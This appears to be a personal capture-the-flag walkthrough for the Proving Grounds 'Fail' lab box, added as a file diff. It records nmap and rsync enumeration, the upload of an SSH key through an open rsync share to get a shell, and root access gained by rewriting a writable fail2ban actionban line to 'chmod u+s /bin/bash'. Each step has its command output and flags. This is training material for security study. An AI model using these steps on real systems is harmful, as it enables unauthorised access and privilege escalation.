@@ -1,0 +1,143 @@
+																			               Fail Walkthrough
+																			
+Walkthrough: https://dylanrholloway.com/proving-grounds-fail-write-up/
+																										
+Attacker's Machine: 192.168.45.5
+Victim's Machine: 192.168.190.126
+export IP=192.168.190.126
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+22/tcp  open  ssh
+873/tcp open  rsync
+
+nmap -Pn -n -sC -sV -p22,873 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+873/tcp open  rsync   (protocol version 31)
+Service Info: OS: Linux
+
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+ 
+Port 873 - rsync
+# An rsync module is essentially a directory share. These modules can optionally be protected by a password. This options lists the available modules and, optionally, determines if the module requires a password to access**:**
+
+# Enumerate shared folders
+nmap -sV --script "rsync-list-modules" -p 873 $IP
+873/tcp open  rsync   (protocol version 31)
+| rsync-list-modules: 
+fox                 fox home                                   # potential SSH username
+
+#  If authentication is not required you can list a shared folder
+rsync -av --list-only rsync://$IP/fox
+drwxr-xr-x          4,096 2021/01/21 09:21:59 .
+lrwxrwxrwx              9 2020/12/03 15:22:42 .bash_history -> /dev/null
+-rw-r--r--            220 2019/04/18 00:12:36 .bash_logout
+-rw-r--r--          3,526 2019/04/18 00:12:36 .bashrc
+-rw-r--r--            807 2019/04/18 00:12:36 .profile
+
+#Transfers all files from the directory recursively <shared_name> on the machine <IP>into the ./rsync_shared directory on the local machine. 
+   The files are transferred in "archive" mode, which ensures that symbolic links, devices, attributes, permissions, ownerships, etc. are preserved in the transfer.
+   
+rsync -av rsync://$IP:873/fox ./rsyn_shared
+
+# rsync allow us to upload files on the shared directory, so let's upload ssh keys so we can get in :D
+
+ssh-keygen -t rsa
+cd /home/kali/.ssh
+cp /root/.ssh/id_rsa.pub .
+cp /root/.ssh/id_rsa .
+chmod 600 id_rsa
+
+# let's create the authorized_keys file as well, since I had no luck connecting just uploading the id_rsa.pub file
+cat id_rsa.pub >> authorized_keys
+cat authorized_keys 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBwznDzzLOxRReFgb/3rEiLMEMEdccDWRT7BxJnddDz3KVhZzU0w/hrFXIf17IxgUvsd6DEzWVIV2uh7XG2u028iYu0UtDW0TmiOAgQUtNzBLRR9Qz55bblTtATajtXwyhwjV3azrnJ/XUqAIDkxjdxu/u5FNTx+mApBJPas019pcMfTfMeUarnxI6vp0ppb8sFQPLyQwCJJAjhQwmDm2T2Q9YB43fE+4NeaZa0HysVWh++0R/NNEHYxRJHKTxGA9bNXkfH4vZL1WUig+rooShtT9XZQ5owv1pqiSyORsqA5dfyrVo9FCw/injiId2z2r2585MICNl84Aix1Qrv2PgLGn8xNBY7kV5tL10hzImlE674QhU/B+UluQyjiXXVNpFFYt0X6E3VQns7PPuUe7yzvLw70zCNmStxAyluCekhJNBnCGU+I2PUP6ogqm6nF4aWQxhHILHW4MQi0YjCIdnWaPU/QVMJDdEa1QcxgpkFpigQnlVOp7pbLSjWxCMDoU= root@kali
+
+# Great, now let's copy the keys into fox/.ssh directory
+
+rsync -r ./.ssh $IP::fox
+
+# Check if our keys have been uploaded
+
+rsync -av --list-only rsync://$IP/fox
+receiving incremental file list
+drwxr-xr-x          4,096 2023/04/09 14:32:01 .
+lrwxrwxrwx              9 2020/12/03 15:22:42 .bash_history -> /dev/null
+-rw-r--r--            220 2019/04/18 00:12:36 .bash_logout
+-rw-r--r--          3,526 2019/04/18 00:12:36 .bashrc
+-rw-r--r--            807 2019/04/18 00:12:36 .profile
+drwxr-xr-x          4,096 2023/04/09 14:32:01 .ssh
+-r--------          2,590 2023/04/09 14:32:01 .ssh/id_rsa
+-rw-------            563 2023/04/09 14:32:01 .ssh/id_rsa.pub
+
+# Ok, now that we have the keys uploaded, let's try to connect through SSH!
+
+ssh -i id_rsa fox@$IP                         # Got shell
+cd /home 
+cat local.txt                                         # Flag: 505d5ddedb33cbcf5a3a11a921e63af9        
+
+
+
+Privilege escalation
+
+id
+uid=1000(fox) gid=1001(fox) groups=1001(fox),1000(fail2ban)
+
+# First let's see if we have writing privileges over the configuration files of fail2ban
+
+find /etc -writable -ls 2>/dev/null
+-rw-rw-r-- 1 root fail2ban 1453 Apr  9 16:38 /etc/fail2ban/action.d/iptables-multiport.conf
+
+# Searching online, we see that we can escalate our privileged when fail2ban is running as long as we or somebody will restart the service.
+   Running pspy64 we notice that the fail2ban is restarted every 1 minute.
+   
+CMD: UID=0    PID=1914   | /bin/sh -c /usr/bin/systemctl restart fail2ban
+
+# fail2ban offers a configuration file called jail.conf, we can check this file to see which service is configured to use it
+
+cat /etc/fail2ban/jail.conf
+
+[sshd]
+enabled = true
+
+# Now that we know which server is using it, let's see the triggers for it. For this we need to check the configuration file iptables-multiport.conf
+
+cat /etc/fail2ban/action.d/iptables-multiport.conf
+# Fail2Ban configuration file
+...
+# Option:  actionban
+# Notes.:  command executed when banning an IP. Take care that the
+#          command is executed with Fail2Ban user rights.
+# Tags:    See jail.conf(5) man page
+# Values:  CMD
+#
+actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
+...
+
+# Aparently we are getting block for 1 minute for each failed attempt. 
+   Now, since we have rights to write on this file, let's give bash suid privileges so we can run a shell as root once we provide a few failed attempts with SSH and once the service is restarted automatically by root.
+
+nano /etc/fail2ban/action.d/iptables-multiport.conf
+# Option:  actionban
+# Notes.:  command executed when banning an IP. Take care that the
+#          command is executed with Fail2Ban user rights.
+# Tags:    See jail.conf(5) man page
+# Values:  CMD
+#
+actionban = chmod u+s /bin/bash
+#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
+
+# Option:  actionunban
+
+# Now, wait 1 minute and use 2-3 failed login attempts with SSH so trigger the ban. Once that has been performed, the chmod u+s /bin/bash command should run.
+
+ls -lsa /bin/bash
+1144 -rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+
+/bin/bash -p
+whoami
+root
+cat /root/proof.txt                                         # Flag: 9f330d1d2e958276eca155121550bc29
